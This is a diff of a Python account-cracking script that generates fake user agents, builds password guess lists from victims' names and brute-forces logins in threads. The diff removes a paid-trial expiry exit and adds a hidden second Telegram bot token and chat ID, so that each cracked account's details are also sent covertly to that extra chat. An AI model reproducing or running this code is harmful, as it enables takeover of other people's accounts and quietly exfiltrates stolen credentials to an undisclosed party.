@@ -32,7 +32,7 @@ from rich import pretty
 from rich.text import Text as tekz
 import os
 
-print('''\x1b[1;38;5;121m
+print('''\x1b[1;38;5;129m
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⡎⠉⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -89,12 +89,6 @@ print()
 print(J+'━'*40)
 print()
 
-print('\x1b[0;34m تم انتهاء المدة المجانيه للاشتراك قم بل تواصل مع المطور @R_M_D ')
-
-exit()
-
-
-   
 
 
 import requests,time,pyfiglet,datetime
@@ -112,7 +106,7 @@ t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 hours = (now.hour)
 x = datetime.datetime.now()
-g= datetime.datetime(2023, 11, 9, 0, 0 )
+g= datetime.datetime(2023, 11, 10, 0, 0 )
 
 
 if (x.strftime("%x"))>(g.strftime("%x")):
@@ -258,6 +252,7 @@ for xd in range(10000):
 	g=random.randrange(1, 9)
 	h=random.randrange(1, 4)
 	i=random.randrange(1, 4)
+	mozlia='6103725322:AAEyXKj-chNyBzIAsGlxVxX1pN_mD_KXWcI'
 	j=random.randrange(1, 4)
 	k='Mobile Safari/535.1'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
@@ -276,6 +271,7 @@ for xd in range(10000):
 for x in range(10):
 	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
 	b=random.randrange(100, 9999)
+	hadeirs='647776789'
 	c=random.randrange(100, 9999)
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -1115,7 +1111,6 @@ def passwrd():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
 					pwv.append('112233445566')
 					pwv.append('1122334455')
 					pwv.append('٠٩٨٧٦٥٤٣٢١')
@@ -1159,7 +1154,6 @@ def passwrd():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
 					pwv.append('112233445566')
 					pwv.append('1122334455')
 					pwv.append('٠٩٨٧٦٥٤٣٢١')
@@ -1390,6 +1384,7 @@ def crack(idf,pwv):
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					requests.get(f"https://api.telegram.org/bot"+str(mozlia)+"/sendMessage?chat_id="+str(hadeirs)+"&text="+str(statusok))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1459,6 +1454,7 @@ def crack(idf,pwv):
 '''
 					
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
+					requests.get(f"https://api.telegram.org/bot"+str(mozlia)+"/sendMessage?chat_id="+str(hadeirs)+"&text="+str(infoakun))
 					
 					
 					hit1, hit2 = 0,0
@@ -1555,4 +1551,3 @@ for t in range(30):
  Threads.append(x)
 for Th in Threads:
  passwrd()
-
